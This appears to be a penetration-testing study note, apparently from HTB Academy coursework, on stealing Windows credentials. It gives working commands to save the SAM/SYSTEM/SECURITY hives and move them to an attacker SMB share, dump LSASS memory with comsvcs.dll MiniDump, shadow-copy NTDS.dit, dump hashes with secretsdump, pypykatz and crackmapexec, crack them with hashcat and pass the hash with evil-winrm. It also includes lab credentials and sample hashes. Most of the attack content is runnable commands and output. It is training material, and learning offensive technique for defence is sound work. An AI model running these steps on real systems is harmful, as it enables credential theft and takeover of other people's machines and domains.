# Local Windows Password Attacks

## SAM database

{% hint style="warning" %}
<mark style="color:red;">**For non-domain joined Windows system**</mark>
{% endhint %}

{% hint style="info" %}
TL;DR

The idea is making a copy of three registry hives. Then transfer those copies to our attacking machine, dump the creds and then crack the NT hash.&#x20;
{% endhint %}

Here are our target registry hives:

* <mark style="color:red;">**hklm\sam :**</mark> Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
* <mark style="color:red;">**hklm\system :**</mark> Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
* <mark style="color:red;">**hklm\security :**</mark> Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

### Create backup of the hives (cmd launched as admin):

{% hint style="info" %}
Technically we will only need <mark style="color:green;">**hklm\sam**</mark> & <mark style="color:green;">**hklm\system**</mark>, but <mark style="color:green;">**hklm\security**</mark> can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.
{% endhint %}

```powershell
C:\WINDOWS\system32 > reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32 > reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32 > reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

### Transfer the backup files to our attacking machine

#### Creating an SMB share (smbserver.py)

```bash
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData <local-destination>
```

#### Moving the copies:

```powershell
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

### Dumping the hashes from hives (secretsdump.py)

```bash
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Dumping local SAM hashes (uid:rid:lmhash:nthash)

```

### Cracking the dumped hashes

```bash
$ sudo hashcat -m 1000 NT-hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

{% hint style="success" %}
Done for the local part for now. This could be done remotely when we have local admin priv for a user. The remote command is below
{% endhint %}

```bash
$ crackmapexec smb <target-ip> --local-auth -u <user> -p <pass> --sam
```

### Remote Dumping and LSA secrets

{% hint style="danger" %}
Local admin privileges required
{% endhint %}

```bash
$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

***

## LSASS service

<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.

Upon initial logon, LSASS will:

* Cache credentials locally in memory
* Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
* Enforce security policies
* Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

### Dumping LSASS Process Memory

{% hint style="info" %}
TL;DR

We will dump LSASS process memory, as the name describes it, with two methods, one that replies on GUI interface and the other doesnt. Then upon transferring it to out attacking host, we will proceed to dump the creds from that file and crack the NT hash.
{% endhint %}

#### Task Manager Method

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

This will create a file at :&#x20;

```powershell
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

And then we can transfer it with whatever method we choose.

#### Rundll32.exe & Comsvcsdll Method

Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`.

```powershell
C:\Windows\system32> tasklist /svc
PS > Get-Process lsass
PS > rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
- comsvcs.dll : exported func that calls MiniDumpWriteDump (MiniDump) function.
- C:\lsass.dmp : Output file.
```

This file will then be transferred to our machine and we then proceed to dump creds and crack them. For that we will use Pypykatz, a python-version of Mimikatz which runs only on Windows.&#x20;

### Dumping the creds

```bash
$ pypykatz lsa minidump <dump-file> 

sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
		
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54

	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Some interesting parts in the findings are:

* <mark style="color:red;">**MSV :**</mark> [MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the final stage of our attack covered at the end of this section.
* <mark style="color:red;">**WDIGEST**</mark> is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update [here](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).
* <mark style="color:red;">**Kerberos :**</mark> [Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.
* <mark style="color:red;">**DPAPI**</mark> : The Data Protection Application Programming Interface or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Mimikatz and Pypykatz can extract the DPAPI `masterkey` for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts.

```bash
$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

***

## AD & NTDS.dit dictionary

{% hint style="warning" %}
<mark style="color:red;">**For Remote/Domain joined Hosts.**</mark>
{% endhint %}

{% hint style="info" %}
After gaining some valid creds, whether from some google dorks, OSINT, social engineering or custom wordlists (with username-anarchy for example), we can then try to bruteforce our way in with crackmapexec with smb using :&#x20;

```bash
$ crackmapexec smb  <target-ip> -u username -p /usr/share/wordlists/fasttrack.txt
```
{% endhint %}

### Connecting to the target

```bash
$ evil-winrm -i <target-ip>-u <user> -p <password>
*Evil-WinRM* PS C:\> net localgroup # Cheking the privileges
```

{% hint style="info" %}
To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights. We also will want to check what domain privileges we have.
{% endhint %}

```powershell
*Evil-WinRM* PS C:\> net user <user>
```

### Shadow Copy of C

We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.

```powershell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

### Moving the copy

Look in [here](local-windows-password-attacks.md#transfer-the-backup-files-to-our-attacking-machine) for the first method.

#### Using crackmapexec&#x20;

Another faster method is using cme, which does all of the above with just one command.

```bash
$ crackmapexec smb <target-ip> -u <username> -p <password>--ntds
```

### Cracking the hash

```bash
$ sudo hashcat -m 1000 <NT-hash> /usr/share/wordlists/rockyou.txt
```

{% hint style="info" %}
Of course the cracking may be unsuccessful, one consideration is using Pass-the-Hash method which takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm).

Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`.

This could be done using :&#x20;

```bash
$ evil-winrm -i <target-ip>  -u  <user> -H <NT-hash>
```
{% endhint %}

## Creds Hunting







